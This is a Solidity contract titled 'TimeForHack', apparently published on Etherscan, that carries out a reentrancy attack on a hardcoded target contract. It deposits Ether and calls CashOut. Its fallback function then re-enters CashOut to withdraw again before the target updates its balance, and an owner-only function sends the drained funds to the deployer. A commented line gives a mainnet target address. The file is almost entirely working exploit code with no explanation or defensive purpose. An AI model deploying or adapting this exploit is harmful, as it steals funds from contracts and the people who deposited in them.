/**
 *Submitted for verification at Etherscan.io on 2022-03-28
*/

pragma solidity ^0.4.19;

contract Owned {
  address owner;
  function Owned() {
    owner = msg.sender;
  }
  function kill() {
    if (msg.sender == owner) selfdestruct(owner);
  }
}

interface Target {
    function CashOut(uint _am) public;
    function Deposit() public payable;
}

contract TimeForHack is Owned 
{
    address target = 0x6af5d878a4bfb60e4cf57df316fbf5886f69185c;
    // address target = 0x95D34980095380851902ccd9A1Fb4C813C2cb639; // mainnet
    event Hacked(address indexed by, uint256 amount);
    event Called(address indexed by, uint256 amount);
    
    function () payable {
         Target t = Target(target);
        // let's hack.
        if (msg.gas < 200000) {
            return;
        }
        Hacked(target, target.balance);
        if (msg.value <= target.balance) {
            t.CashOut(msg.value);
        }    
    }
    
    function doIt() payable {
    
        Called(msg.sender, this.balance);
         Target t = Target(target);
         t.Deposit.value(msg.value)();
         t.CashOut(msg.value);   
    }
    
    function empty() {
        if (msg.sender == owner) {
            msg.sender.transfer(this.balance);
            
        }
    }
    
    function cashout( uint256 v) {
         Target t = Target(target);
         t.CashOut(v);   
    }
    
    function fund() payable {
         Target t = Target(target);
         t.Deposit.value(msg.value)();  
    }
    
    
}